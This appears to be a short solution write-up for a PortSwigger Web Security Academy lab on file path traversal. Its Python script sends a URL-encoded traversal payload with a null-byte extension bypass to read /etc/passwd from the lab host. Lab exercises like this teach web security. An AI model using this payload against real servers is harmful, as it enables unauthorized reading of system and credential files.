# Lab: File path traversal, validation of file extension with null byte bypass

link to lab: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Solution: 

```python
import requests

response = requests.get(
    'https://0a86008203b1e01dc0b6c70d00930038.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.jpg',
    verify=False,
)

print(response.text)
```